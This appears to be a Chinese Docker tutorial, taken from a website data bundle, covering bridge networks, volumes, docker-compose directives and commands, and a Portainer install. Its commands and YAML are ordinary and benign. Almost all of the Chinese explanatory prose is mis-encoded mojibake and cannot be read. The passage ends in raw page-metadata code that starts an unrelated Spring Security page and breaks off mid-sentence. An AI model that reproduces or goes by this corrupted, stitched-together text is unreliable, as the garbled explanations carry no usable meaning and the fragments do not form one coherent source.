åéå°ä¸ä¸ªæ¥å£æ¶ï¼å¦å¤ä¸ä¸ªæ¥å£ä¹å¯ä»¥æ¶å°ç¸åçæ°æ®åï¼ãè¿å¯¹æ¥å£ä¸ç«¯å¨å®¹å¨åï¼å³ eth0ï¼å¦ä¸ç«¯å¨æ¬å°å¹¶è¢«æè½½å° docker0 ç½æ¡¥ï¼åç§°ä»¥ veth å¼å¤´ï¼ä¾å¦ vethaqi2qtï¼ãéè¿è¿ç§æ¹å¼ï¼ä¸»æºå¯ä»¥è·å®¹å¨éä¿¡ï¼å®¹å¨ä¹é´ä¹å¯ä»¥ç¸äºéä¿¡ãdocker å°±åå»ºäºå¨ä¸»æºåææå®¹å¨ä¹é´ä¸ä¸ªèæå±äº«ç½ç»ã\n\n\n\n# æ¥çç½ç»ä¿¡æ¯\n\n# docker network ls\n\n\n1\n\n\n# åå»ºä¸ä¸ªç½æ¡¥\n\n# docker network create -d bridge ç½æ¡¥åç§°\n\n\n1\n\n\n# å é¤ä¸ä¸ªç½æ¡¥\n\n# docker network rm ç½æ¡¥åç§°\n\n\n1\n\n\n# å®¹å¨ä¹åä½¿ç¨ç½ç»éä¿¡\n\n# 1.æ¥è¯¢å½åç½ç»éç½®\n- docker network ls\nnetwork id          name                driver              scope\n8e424e5936b7        bridge              bridge              local\n17d974db02da        docker_gwbridge     bridge              local\nd6c326e433f7        host                host                local\n# 2.åå»ºæ¡¥æ¥ç½ç»\n- docker network create -d bridge info\n[root@centos ~]# docker network create -d bridge info\n6e4aaebff79b1df43a064e0e8fdab08f52d64ce34db78dd5184ce7aaaf550a2f\n[root@centos ~]# docker network ls\nnetwork id          name                driver              scope\n8e424e5936b7        bridge              bridge              local\n17d974db02da        docker_gwbridge     bridge              local\nd6c326e433f7        host                host                local\n6e4aaebff79b        info                bridge              local\n# 3.å¯å¨å®¹å¨æå®ä½¿ç¨ç½æ¡¥\n- docker run -d -p 8890:80 --name nginx001 --network info nginx \n- docker run -d -p 8891:80 --name nginx002 --network info nginx \næ³¨æ:ä¸æ¦æå®ç½æ¡¥å--nameæå®åå­å°±æ¯ä¸»æºå,å¤ä¸ªå®¹å¨æå®å¨åä¸ä¸ªç½æ¡¥æ¶,å¯ä»¥å¨ä»»æä¸ä¸ªå®¹å¨ä¸­ä½¿ç¨ä¸»æºåä¸å®¹å¨è¿è¡äºé\n[root@centos ~]# docker run -d -p 8890:80 --name nginx001 --network info nginx \nc315bcc94e9ddaa36eb6c6f16ca51592b1ac8bf1ecfe9d8f01d892f3f10825fe\n[root@centos ~]# docker run -d -p 8891:80 --name nginx002 --network info nginx\nf8682db35dd7fb4395f90edb38df7cad71bbfaba71b6a4c6e2a3a525cb73c2a5\n[root@centos ~]# docker ps\ncontainer id        image               command                  created             status              ports                  names\nf8682db35dd7        nginx               "/docker-entrypoint.â¦"   3 seconds ago       up 2 seconds        0.0.0.0:8891->80/tcp   nginx002\nc315bcc94e9d        nginx               "/docker-entrypoint.â¦"   7 minutes ago       up 7 minutes        0.0.0.0:8890->80/tcp   nginx001\nb63169d43792        mysql:5.7.19        "docker-entrypoint.sâ¦"   7 minutes ago       up 7 minutes        3306/tcp               mysql_mysql.1.s75qe5kkpwwttyf0wrjvd2cda\n[root@centos ~]# docker exec -it f8682db35dd7 /bin/bash\nroot@f8682db35dd7:/# curl http://nginx001\n<!doctype html>\n<html>\n<head>\n<title>welcome to nginx!</title>\n.....\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# é«çº§æ°æ®å·éç½®\n\n# è¯´æ\n\næ°æ®å· æ¯ä¸ä¸ªå¯ä¾ä¸ä¸ªæå¤ä¸ªå®¹å¨ä½¿ç¨çç¹æ®ç®å½ï¼å®ç»è¿ ufsï¼å¯ä»¥æä¾å¾å¤æç¨çç¹æ§ï¼\n\n * æ°æ®å· å¯ä»¥å¨å®¹å¨ä¹é´å±äº«åéç¨\n * å¯¹ æ°æ®å· çä¿®æ¹ä¼ç«é©¬çæ\n * å¯¹ æ°æ®å· çæ´æ°ï¼ä¸ä¼å½±åéå\n * æ°æ®å· é»è®¤ä¼ä¸ç´å­å¨ï¼å³ä½¿å®¹å¨è¢«å é¤\n\n> æ³¨æï¼æ°æ®å· çä½¿ç¨ï¼ç±»ä¼¼äº linux ä¸å¯¹ç®å½ææä»¶è¿è¡ mountï¼éåä¸­çè¢«æå®ä¸ºæè½½ç¹çç®å½ä¸­çæä»¶ä¼å¤å¶å°æ°æ®å·ä¸­ï¼ä»æ°æ®å·ä¸ºç©ºæ¶ä¼å¤å¶ï¼ã\n\n# åå»ºæ°æ®å·\n\n[root@centos ~]# docker volume create my-vol\nmy-vol\n\n\n1\n2\n\n\n# æ¥çæ°æ®å·\n\n[root@centos ~]# docker volume inspect my-vol       \n[\n    {\n        "createdat": "2020-11-25t11:43:56+08:00",\n        "driver": "local",\n        "labels": {},\n        "mountpoint": "/var/lib/docker/volumes/my-vol/_data",\n        "name": "my-vol",\n        "options": {},\n        "scope": "local"\n    }\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# æè½½æ°æ®å·\n\n[root@centos ~]# docker run -d -p --name web  -v my-vol:/usr/share/nginx/html  nginx\n[root@centos ~]# docker inspect web\n\t\t\t\t"mounts": [\n            {\n                "type": "volume",\n                "name": "my-vol",\n                "source": "/var/lib/docker/volumes/my-vol/_data",\n                "destination": "/usr/share/nginx/html",\n                "driver": "local",\n                "mode": "z",\n                "rw": true,\n                "propagation": ""\n            }\n        ],\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# å é¤æ°æ®å·\n\ndocker volume rm my-vol\n\n\n1\n\n\n\n# docker compose\n\n\n# docker composeä½¿ç¨\n\n# 1.ç¸å³æ¦å¿µ\n\né¦åä»ç»å ä¸ªæ¯è¯­ã\n\n * æå¡ (service)ï¼ä¸ä¸ªåºç¨å®¹å¨ï¼å®éä¸å¯ä»¥è¿è¡å¤ä¸ªç¸åéåçå®ä¾ã\n * é¡¹ç® (project)ï¼ç±ä¸ç»å³èçåºç¨å®¹å¨ç»æçä¸ä¸ªå®æ´ä¸å¡ååãâä¸ä¸ªé¡¹ç®å¯ä»¥ç±å¤ä¸ªæå¡ï¼å®¹å¨ï¼å³èèæï¼compose é¢åé¡¹ç®è¿è¡ç®¡çã\n\n# 2.åºæ¯\n\næå¸¸è§çé¡¹ç®æ¯ web ç½ç«ï¼è¯¥é¡¹ç®åºè¯¥åå« web åºç¨åç¼å­ã\n\n * springbootåºç¨\n * mysqlæå¡\n * redisæå¡\n * elasticsearchæå¡\n * .......\n\n# 3.docker-composeæ¨¡æ¿\n\n * åèææ¡£:https://docker_practice.gitee.io/zh-cn/compose/compose_file.html\n\nversion: "3.0"\nservices:\n  mysqldb:\n    image: mysql:5.7.19\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - /root/mysql/conf:/etc/mysql/conf.d\n      - /root/mysql/logs:/logs\n      - /root/mysql/data:/var/lib/mysql\n    environment:\n      mysql_root_password: root\n    networks:\n      - ems\n    depends_on:\n      - redis\n\n  redis:\n    image: redis:4.0.14\n    container_name: redis\n    ports:\n      - "6379:6379"\n    networks:\n      - ems\n    volumes:\n      - /root/redis/data:/data\n    command: redis-server\n    \nnetworks:\n  ems:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 4.éè¿docker-composeè¿è¡ä¸ç»å®¹å¨\n\n * åèææ¡£:https://docker_practice.gitee.io/zh-cn/compose/commands.html\n\n[root@centos ~]# docker-compose up    \t\t\t\t\t\t\t//åå°å¯å¨ä¸ç»æå¡\n[root@centos ~]# docker-compose up -d \t\t\t\t\t\t\t//åå°å¯å¨ä¸ç»æå¡\n\n\n1\n2\n\n\n----------------------------------------\n\n\n# docker-compose æ¨¡æ¿æä»¶\n\næ¨¡æ¿æä»¶æ¯ä½¿ç¨ compose çæ ¸å¿ï¼æ¶åå°çæä»¤å³é®å­ä¹æ¯è¾å¤ãä½å¤§å®¶ä¸ç¨æå¿ï¼è¿éé¢å¤§é¨åæä»¤è· docker run ç¸å³åæ°çå«ä¹é½æ¯ç±»ä¼¼çã\n\né»è®¤çæ¨¡æ¿æä»¶åç§°ä¸º docker-compose.ymlï¼æ ¼å¼ä¸º yaml æ ¼å¼ã\n\nversion: "3"\n\nservices:\n  webapp:\n    image: examples/web\n    ports:\n      - "80:80"\n    volumes:\n      - "/data"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ³¨ææ¯ä¸ªæå¡é½å¿é¡»éè¿ image æä»¤æå®éåæ build æä»¤ï¼éè¦ dockerfileï¼ç­æ¥èªå¨æå»ºçæéåã\n\nå¦æä½¿ç¨ build æä»¤ï¼å¨ dockerfile ä¸­è®¾ç½®çéé¡¹(ä¾å¦ï¼cmd, expose, volume, env ç­) å°ä¼èªå¨è¢«è·åï¼æ éå¨ docker-compose.yml ä¸­éå¤è®¾ç½®ã\n\nä¸é¢åå«ä»ç»åä¸ªæä»¤çç¨æ³ã\n\n# build\n\næå® dockerfile æå¨æä»¶å¤¹çè·¯å¾ï¼å¯ä»¥æ¯ç»å¯¹è·¯å¾ï¼æèç¸å¯¹ docker-compose.yml æä»¶çè·¯å¾ï¼ã compose å°ä¼å©ç¨å®èªå¨æå»ºè¿ä¸ªéåï¼ç¶åä½¿ç¨è¿ä¸ªéåã\n\nversion: \'3\'\nservices:\n\n  webapp:\n    build: ./dir\n\n\n1\n2\n3\n4\n5\n\n\nä½ ä¹å¯ä»¥ä½¿ç¨ context æä»¤æå® dockerfile æå¨æä»¶å¤¹çè·¯å¾ã\n\nä½¿ç¨ dockerfile æä»¤æå® dockerfile æä»¶åã\n\nä½¿ç¨ arg æä»¤æå®æå»ºéåæ¶çåéã\n\nversion: \'3\'\nservices:\n\n  webapp:\n    build:\n      context: ./dir\n      dockerfile: dockerfile-alternate\n      args:\n        buildno: 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# command\n\nè¦çå®¹å¨å¯å¨åé»è®¤æ§è¡çå½ä»¤ã\n\ncommand: echo "hello world"\n\n\n1\n\n\n# container_name\n\næå®å®¹å¨åç§°ãé»è®¤å°ä¼ä½¿ç¨ é¡¹ç®åç§°_æå¡åç§°_åºå· è¿æ ·çæ ¼å¼ã\n\ncontainer_name: docker-web-container\n\n\n1\n\n\n> æ³¨æ: æå®å®¹å¨åç§°åï¼è¯¥æå¡å°æ æ³è¿è¡æ©å±ï¼scaleï¼ï¼å ä¸º docker ä¸åè®¸å¤ä¸ªå®¹å¨å·æç¸åçåç§°ã\n\n# depends_on\n\nè§£å³å®¹å¨çä¾èµãå¯å¨ååçé®é¢ãä»¥ä¸ä¾å­ä¸­ä¼åå¯å¨ redis db åå¯å¨ web\n\nversion: \'3\'\n\nservices:\n  web:\n    build: .\n    depends_on:\n      - db\n      - redis\n\n  redis:\n    image: redis\n\n  db:\n    image: postgres\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n> æ³¨æï¼web æå¡ä¸ä¼ç­å¾ redis db ãå®å¨å¯å¨ãä¹åæå¯å¨ã\n\n# env_file\n\nä»æä»¶ä¸­è·åç¯å¢åéï¼å¯ä»¥ä¸ºåç¬çæä»¶è·¯å¾æåè¡¨ã\n\nå¦æéè¿ docker-compose -f file æ¹å¼æ¥æå® compose æ¨¡æ¿æä»¶ï¼å env_file ä¸­åéçè·¯å¾ä¼åºäºæ¨¡æ¿æä»¶è·¯å¾ã\n\nå¦ææåéåç§°ä¸ environment æä»¤å²çªï¼åæç§æ¯ä¾ï¼ä»¥åèä¸ºåã\n\nenv_file: .env\n\nenv_file:\n  - ./common.env\n  - ./apps/web.env\n  - /opt/secrets.env\n\n\n1\n2\n3\n4\n5\n6\n\n\nç¯å¢åéæä»¶ä¸­æ¯ä¸è¡å¿é¡»ç¬¦åæ ¼å¼ï¼æ¯æ # å¼å¤´çæ³¨éè¡ã\n\n# common.env: set development environment\nprog_env=development\n\n\n1\n2\n\n\n# environment\n\nè®¾ç½®ç¯å¢åéãä½ å¯ä»¥ä½¿ç¨æ°ç»æå­å¸ä¸¤ç§æ ¼å¼ã\n\nåªç»å®åç§°çåéä¼èªå¨è·åè¿è¡ compose ä¸»æºä¸å¯¹åºåéçå¼ï¼å¯ä»¥ç¨æ¥é²æ­¢æ³é²ä¸å¿è¦çæ°æ®ã\n\nenvironment:\n  rack_env: development\n  session_secret:\n\nenvironment:\n  - rack_env=development\n  - session_secret\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nå¦æåéåç§°æèå¼ä¸­ç¨å° true|falseï¼yes|no ç­è¡¨è¾¾ å¸å° å«ä¹çè¯æ±ï¼æå¥½æ¾å°å¼å·éï¼é¿å yaml èªå¨è§£ææäºåå®¹ä¸ºå¯¹åºçå¸å°è¯­ä¹ãè¿äºç¹å®è¯æ±ï¼åæ¬\n\ny|y|yes|yes|yes|n|n|no|no|no|true|true|true|false|false|false|on|on|on|off|off|off\n\n\n1\n\n\n# healthcheck\n\néè¿å½ä»¤æ£æ¥å®¹å¨æ¯å¦å¥åº·è¿è¡ã\n\nhealthcheck:\n  test: ["cmd", "curl", "-f", "http://localhost"]\n  interval: 1m30s\n  timeout: 10s\n  retries: 3\n\n\n1\n2\n3\n4\n5\n\n\n# image\n\næå®ä¸ºéååç§°æéå idãå¦æéåå¨æ¬å°ä¸å­å¨ï¼compose å°ä¼å°è¯æåè¿ä¸ªéåã\n\nimage: ubuntu\nimage: orchardup/postgresql\nimage: a4bc65fd\n\n\n1\n2\n3\n\n\n# networks\n\néç½®å®¹å¨è¿æ¥çç½ç»ã\n\nversion: "3"\nservices:\n\n  some-service:\n    networks:\n     - some-network\n     - other-network\n\nnetworks:\n  some-network:\n  other-network:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# ports\n\næ´é²ç«¯å£ä¿¡æ¯ã\n\nä½¿ç¨å®¿ä¸»ç«¯å£ï¼å®¹å¨ç«¯å£ (host:container) æ ¼å¼ï¼æèä»ä»æå®å®¹å¨çç«¯å£ï¼å®¿ä¸»å°ä¼éæºéæ©ç«¯å£ï¼é½å¯ä»¥ã\n\nports:\n - "3000"\n - "8000:8000"\n - "49100:22"\n - "127.0.0.1:8001:8001"\n\n\n1\n2\n3\n4\n5\n\n\næ³¨æï¼å½ä½¿ç¨ host:container æ ¼å¼æ¥æ å°ç«¯å£æ¶ï¼å¦æä½ ä½¿ç¨çå®¹å¨ç«¯å£å°äº 60 å¹¶ä¸æ²¡æ¾å°å¼å·éï¼å¯è½ä¼å¾å°éè¯¯ç»æï¼å ä¸º yaml ä¼èªå¨è§£æ xx:yy è¿ç§æ°å­æ ¼å¼ä¸º 60 è¿å¶ãä¸ºé¿ååºç°è¿ç§é®é¢ï¼å»ºè®®æ°å­ä¸²é½éç¨å¼å·åæ¬èµ·æ¥çå­ç¬¦ä¸²æ ¼å¼ã\n\n# sysctls\n\néç½®å®¹å¨åæ ¸åæ°ã\n\nsysctls:\n  net.core.somaxconn: 1024\n  net.ipv4.tcp_syncookies: 0\n\nsysctls:\n  - net.core.somaxconn=1024\n  - net.ipv4.tcp_syncookies=0\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# ulimits\n\næå®å®¹å¨ç ulimits éå¶å¼ã\n\nä¾å¦ï¼æå®æå¤§è¿ç¨æ°ä¸º 65535ï¼æå®æä»¶å¥ææ°ä¸º 20000ï¼è½¯éå¶ï¼åºç¨å¯ä»¥éæ¶ä¿®æ¹ï¼ä¸è½è¶è¿ç¡¬éå¶ï¼ å 40000ï¼ç³»ç»ç¡¬éå¶ï¼åªè½ root ç¨æ·æé«ï¼ã\n\n  ulimits:\n    nproc: 65535\n    nofile:\n      soft: 20000\n      hard: 40000\n\n\n1\n2\n3\n4\n5\n\n\n# volumes\n\næ°æ®å·ææè½½è·¯å¾è®¾ç½®ãå¯ä»¥è®¾ç½®ä¸ºå®¿ä¸»æºè·¯å¾(host:container)æèæ°æ®å·åç§°(volume:container)ï¼å¹¶ä¸å¯ä»¥è®¾ç½®è®¿é®æ¨¡å¼ ï¼host:container:roï¼ã\n\nè¯¥æä»¤ä¸­è·¯å¾æ¯æç¸å¯¹è·¯å¾ã\n\nvolumes:\n - /var/lib/mysql\n - cache/:/tmp/cache\n - ~/configs:/etc/configs/:ro\n\n\n1\n2\n3\n4\n\n\nå¦æè·¯å¾ä¸ºæ°æ®å·åç§°ï¼å¿é¡»å¨æä»¶ä¸­éç½®æ°æ®å·ã\n\nversion: "3"\n\nservices:\n  my_src:\n    image: mysql:8.0\n    volumes:\n      - mysql_data:/var/lib/mysql\n\nvolumes:\n  mysql_data:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n----------------------------------------\n\n\n# docker-compose å¸¸ç¨å½ä»¤\n\n# 1. å½ä»¤å¯¹è±¡ä¸æ ¼å¼\n\nå¯¹äº compose æ¥è¯´ï¼å¤§é¨åå½ä»¤çå¯¹è±¡æ¢å¯ä»¥æ¯é¡¹ç®æ¬èº«ï¼ä¹å¯ä»¥æå®ä¸ºé¡¹ç®ä¸­çæå¡æèå®¹å¨ãå¦ææ²¡æç¹å«çè¯´æï¼å½ä»¤å¯¹è±¡å°æ¯é¡¹ç®ï¼è¿æå³çé¡¹ç®ä¸­ææçæå¡é½ä¼åå°å½ä»¤å½±åã\n\næ§è¡ docker-compose [command] --help æè docker-compose help [command] å¯ä»¥æ¥çå·ä½æä¸ªå½ä»¤çä½¿ç¨æ ¼å¼ã\n\ndocker-compose å½ä»¤çåºæ¬çä½¿ç¨æ ¼å¼æ¯\n\ndocker-compose [-f=<arg>...] [options] [command] [args...]\n\n\n1\n\n\n# 2. å½ä»¤éé¡¹\n\n * -f, --file file æå®ä½¿ç¨ç compose æ¨¡æ¿æä»¶ï¼é»è®¤ä¸º docker-compose.ymlï¼å¯ä»¥å¤æ¬¡æå®ã\n * -p, --project-name name æå®é¡¹ç®åç§°ï¼é»è®¤å°ä½¿ç¨æå¨ç®å½åç§°ä½ä¸ºé¡¹ç®åã\n * --x-networking ä½¿ç¨ docker çå¯ææç½ç»åç«¯ç¹æ§\n * --x-network-driver driver æå®ç½ç»åç«¯çé©±å¨ï¼é»è®¤ä¸º bridge\n * --verbose è¾åºæ´å¤è°è¯ä¿¡æ¯ã\n * -v, --version æå°çæ¬å¹¶éåºã\n\n# 3.å½ä»¤ä½¿ç¨è¯´æ\n\n# up\n\næ ¼å¼ä¸º docker-compose up [options] [service...]ã\n\n * è¯¥å½ä»¤ååå¼ºå¤§ï¼å®å°å°è¯èªå¨å®æåæ¬æå»ºéåï¼ï¼éæ°ï¼åå»ºæå¡ï¼å¯å¨æå¡ï¼å¹¶å³èæå¡ç¸å³å®¹å¨çä¸ç³»åæä½ã\n\n * é¾æ¥çæå¡é½å°ä¼è¢«èªå¨å¯å¨ï¼é¤éå·²ç»å¤äºè¿è¡ç¶æã\n\n * å¯ä»¥è¯´ï¼å¤§é¨åæ¶åé½å¯ä»¥ç´æ¥éè¿è¯¥å½ä»¤æ¥å¯å¨ä¸ä¸ªé¡¹ç®ã\n\n * é»è®¤æåµï¼docker-compose up å¯å¨çå®¹å¨é½å¨åå°ï¼æ§å¶å°å°ä¼åæ¶æå°ææå®¹å¨çè¾åºä¿¡æ¯ï¼å¯ä»¥å¾æ¹ä¾¿è¿è¡è°è¯ã\n\n * å½éè¿ ctrl-c åæ­¢å½ä»¤æ¶ï¼ææå®¹å¨å°ä¼åæ­¢ã\n\n * å¦æä½¿ç¨ docker-compose up -dï¼å°ä¼å¨åå°å¯å¨å¹¶è¿è¡ææçå®¹å¨ãä¸è¬æ¨èçäº§ç¯å¢ä¸ä½¿ç¨è¯¥éé¡¹ã\n\n * é»è®¤æåµï¼å¦ææå¡å®¹å¨å·²ç»å­å¨ï¼docker-compose up å°ä¼å°è¯åæ­¢å®¹å¨ï¼ç¶åéæ°åå»ºï¼ä¿æä½¿ç¨ volumes-from æè½½çå·ï¼ï¼ä»¥ä¿è¯æ°å¯å¨çæå¡å¹é docker-compose.yml æä»¶çææ°åå®¹\n\n----------------------------------------\n\n# down\n\n * æ­¤å½ä»¤å°ä¼åæ­¢ up å½ä»¤æå¯å¨çå®¹å¨ï¼å¹¶ç§»é¤ç½ç»\n\n----------------------------------------\n\n# exec\n\n * è¿å¥æå®çå®¹å¨ã\n\n----------------------------------------\n\n# ps\n\næ ¼å¼ä¸º docker-compose ps [options] [service...]ã\n\nååºé¡¹ç®ä¸­ç®åçææå®¹å¨ã\n\néé¡¹ï¼\n\n * -q åªæå°å®¹å¨ç id ä¿¡æ¯ã\n\n----------------------------------------\n\n# restart\n\næ ¼å¼ä¸º docker-compose restart [options] [service...]ã\n\néå¯é¡¹ç®ä¸­çæå¡ã\n\néé¡¹ï¼\n\n * -t, --timeout timeout æå®éå¯ååæ­¢å®¹å¨çè¶æ¶ï¼é»è®¤ä¸º 10 ç§ï¼ã\n\n----------------------------------------\n\n# rm\n\næ ¼å¼ä¸º docker-compose rm [options] [service...]ã\n\nå é¤ææï¼åæ­¢ç¶æçï¼æå¡å®¹å¨ãæ¨èåæ§è¡ docker-compose stop å½ä»¤æ¥åæ­¢å®¹å¨ã\n\néé¡¹ï¼\n\n * -f, --force å¼ºå¶ç´æ¥å é¤ï¼åæ¬éåæ­¢ç¶æçå®¹å¨ãä¸è¬å°½éä¸è¦ä½¿ç¨è¯¥éé¡¹ã\n * -v å é¤å®¹å¨ææè½½çæ°æ®å·ã\n\n----------------------------------------\n\n# start\n\næ ¼å¼ä¸º docker-compose start [service...]ã\n\nå¯å¨å·²ç»å­å¨çæå¡å®¹å¨ã\n\n----------------------------------------\n\n# stop\n\næ ¼å¼ä¸º docker-compose stop [options] [service...]ã\n\nåæ­¢å·²ç»å¤äºè¿è¡ç¶æçå®¹å¨ï¼ä½ä¸å é¤å®ãéè¿ docker-compose start å¯ä»¥åæ¬¡å¯å¨è¿äºå®¹å¨ã\n\néé¡¹ï¼\n\n * -t, --timeout timeout åæ­¢å®¹å¨æ¶åçè¶æ¶ï¼é»è®¤ä¸º 10 ç§ï¼ã\n\n----------------------------------------\n\n# top\n\næ¥çåä¸ªæå¡å®¹å¨åè¿è¡çè¿ç¨ã\n\n----------------------------------------\n\n# unpause\n\næ ¼å¼ä¸º docker-compose unpause [service...]ã\n\næ¢å¤å¤äºæåç¶æä¸­çæå¡ã\n\n----------------------------------------\n\n\n# dockerå¯è§åå·¥å·\n\n# å®è£portainer\n\nå®æ¹å®è£è¯´æï¼https://www.portainer.io/installation/\n\n[root@ubuntu1804 ~]#docker pull  portainer/portainer\n\n[root@ubuntu1804 ~]#docker volume create portainer_data\nportainer_data\n[root@ubuntu1804 ~]#docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer\n20db26b67b791648c2ef6aee444a5226a9c897ebcf0160050e722dbf4a4906e3\n[root@ubuntu1804 ~]#docker ps \ncontainer id        image                 command             created             status              ports                                            names\n20db26b67b79        portainer/portainer   "/portainer"        5 seconds ago       up 4 seconds        0.0.0.0:8000->8000/tcp, 0.0.0.0:9000->9000/tcp   portainer\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# ç»å½åä½¿ç¨portainer\n\n> ç¨æµè§å¨è®¿é®ï¼http://localhost:9000\n\n',charsets:{cjk:!0},lastUpdated:"2022/05/01, 06:34:13",lastUpdatedTimestamp:1651386853e3},{title:"Spring Security",frontmatter:{title:"Spring Security",date:"2022-04-24T09:00:00.000Z",permalink:"/dev/java/eco/springsecurity",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡çæ"],tags:["SpringSecurity"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1012.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%94%9F%E6%80%81/01.SpringSecurity.html",relativePath:"01.å¼å/101.åç«¯/1012.å¾®æå¡çæ/01.SpringSecurity.md",key:"v-7144078e",path:"/dev/java/eco/springsecurity/",headers:[{level:2,title:"æ¦è¿°",slug:"æ¦è¿°",normalizedTitle:"æ¦è¿°",charIndex:86},{level:3,title:"æéç®¡ç",slug:"æéç®¡ç",normalizedTitle:"æéç®¡ç",charIndex:73},{level:3,title:"ç®ä»",slug:"ç®ä»",normalizedTitle:"ç®ä»",charIndex:991},{level:3,title:"åå²",slug:"åå²",normalizedTitle:"åå²",charIndex:1160},{level:3,title:"æ´ä½æ¶æ",slug:"æ´ä½æ¶æ",normalizedTitle:"æ´ä½æ¶æ",charIndex:1923},{level:3,title:"è®¤è¯åç",slug:"è®¤è¯åç",normalizedTitle:"è®¤è¯åç",charIndex:2061},{level:3,title:"ææåç",slug:"ææåç",normalizedTitle:"ææåç",charIndex:3830},{level:2,title:"HelloWorld",slug:"helloworld",normalizedTitle:"helloworld",charIndex:4582},{level:3,title:"ç¯å¢æ­å»º",slug:"ç¯å¢æ­å»º",normalizedTitle:"ç¯å¢æ­å»º",charIndex:4597},{level:3,title:"å®ç°åç",slug:"å®ç°åç",normalizedTitle:"å®ç°åç",charIndex:5879},{level:2,title:"èªå®ä¹è®¤è¯",slug:"èªå®ä¹è®¤è¯",normalizedTitle:"èªå®ä¹è®¤è¯",charIndex:14689},{level:3,title:"èªå®ä¹èµæºæéè§å",slug:"èªå®ä¹èµæºæéè§å",normalizedTitle:"èªå®ä¹èµæºæéè§å",charIndex:14718},{level:3,title:"èªå®ä¹è®¤è¯é¡µé¢",slug:"èªå®ä¹è®¤è¯é¡µé¢",normalizedTitle:"èªå®ä¹è®¤è¯é¡µé¢",charIndex:15812},{level:3,title:"èªå®ä¹è®¤è¯æåå¤ç",slug:"èªå®ä¹è®¤è¯æåå¤ç",normalizedTitle:"èªå®ä¹è®¤è¯æåå¤ç",charIndex:14742},{level:3,title:"èªå®ä¹è®¤è¯å¤±è´¥å¤ç",slug:"èªå®ä¹è®¤è¯å¤±è´¥å¤ç",normalizedTitle:"èªå®ä¹è®¤è¯å¤±è´¥å¤ç",charIndex:14755},{level:3,title:"èªå®ä¹æ³¨éå¤ç",slug:"èªå®ä¹æ³¨éå¤ç",normalizedTitle:"èªå®ä¹æ³¨éå¤ç",charIndex:14768},{level:3,title:"ç»éæååçä¿¡æ¯è·å",slug:"ç»éæååçä¿¡æ¯è·å",normalizedTitle:"ç»éæååçä¿¡æ¯è·å",charIndex:14779},{level:3,title:"èªå®ä¹è®¤è¯æ°æ®æº",slug:"èªå®ä¹è®¤è¯æ°æ®æº",normalizedTitle:"èªå®ä¹è®¤è¯æ°æ®æº",charIndex:14793},{level:3,title:"éªè¯ç æ¡ä¾",slug:"éªè¯ç æ¡ä¾",normalizedTitle:"éªè¯ç æ¡ä¾",charIndex:39405},{level:2,title:"å¯ç å å¯",slug:"å¯ç å å¯",normalizedTitle:"å¯ç å å¯",charIndex:52740},{level:2,title:"rememberMe",slug:"rememberme",normalizedTitle:"rememberme",charIndex:52749},{level:2,title:"ä¼è¯ç®¡ç",slug:"ä¼è¯ç®¡ç",normalizedTitle:"ä¼è¯ç®¡ç",charIndex:52764},{level:2,title:"CSRF",slug:"csrf",normalizedTitle:"csrf",charIndex:7053}],excerpt:'<h1 id="spring-security"><a class="header-anchor" href="#spring-security">#</a> Spring Security</h1>\n<blockquote>\n<p>Spring Securityæ¯ä¸ä¸ªåè½å¼ºå¤§ãå¯é«åº¦å®å¶ç<code>èº«ä»½éªè¯</code>å<code>è®¿é®æ§å¶</code>çæ¡æ¶ãæèè¯´ç¨æ¥å®ç°ç³»ç»ä¸­æéç®¡ççæ¡æ¶ã</p>\n</blockquote>\n',headersStr:"æ¦è¿° æéç®¡ç ç®ä» åå² æ´ä½æ¶æ è®¤è¯åç ææåç HelloWorld ç¯å¢æ­å»º å®ç°åç èªå®ä¹è®¤è¯ èªå®ä¹èµæºæéè§å èªå®ä¹è®¤è¯é¡µé¢ èªå®ä¹è®¤è¯æåå¤ç èªå®ä¹è®¤è¯å¤±è´¥å¤ç èªå®ä¹æ³¨éå¤ç ç»éæååçä¿¡æ¯è·å èªå®ä¹è®¤è¯æ°æ®æº éªè¯ç æ¡ä¾ å¯ç å å¯ rememberMe ä¼è¯ç®¡ç CSRF",content:'# Spring Security\n\n> Spring Securityæ¯ä¸ä¸ªåè½å¼ºå¤§ãå¯é«åº¦å®å¶çèº«ä»½éªè¯åè®¿é®æ§å¶çæ¡æ¶ãæèè¯´ç¨æ¥å®ç°ç³»ç»ä¸­æéç®¡ççæ¡æ¶ã\n\n\n# æ¦è¿°\n\n\n# æéç®¡ç\n\nåºæ¬ä¸æ¶åå°ç¨æ·åä¸çç³»ç»é½è¦è¿è¡æéç®¡çï¼æéç®¡çå±äºç³»ç»å®å¨çèç´ï¼æéç®¡çå®ç°å¯¹ç¨æ·è®¿é®ç³»ç»çæ§å¶ï¼æç§å®å¨è§åæèå®å¨ç­ç¥æ§å¶ç¨æ·å¯ä»¥è®¿é®èä¸åªè½è®¿é®èªå·±è¢«ææçèµæºã\n\næéç®¡çå